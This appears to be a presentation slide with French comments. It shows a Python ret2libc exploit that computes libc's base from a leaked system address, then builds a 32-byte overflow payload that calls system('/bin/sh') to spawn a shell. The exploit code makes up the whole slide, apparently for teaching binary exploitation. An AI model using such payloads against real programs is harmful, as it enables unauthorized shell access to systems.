## Ret2libc - Exploit - payload

``` python
# Parser l'adresse de system
libc_system = int(data.split("@")[1].split("\n")[0], 16)

# Trouver la base de libc
libc_system_offset = 0x3ab30
libc_base = libc_system - libc_system_offset

# Trouver l'adresse de "/bin/sh" a partir de la base de libc
binsh_offset = 0x15c739
binsh = libc_base + binsh_offset

payload = "A" * 32 # Padding jusqu'a l'adresse de retour
payload += p32(libc_system) # Ecraser adresse de retour par adresse de system
payload += p32(binsh) # Argument 1 (pointeur vers "/bin/sh")

# Press ze button!
p.sendline(payload)
```
<!-- .element: class="stretch" -->
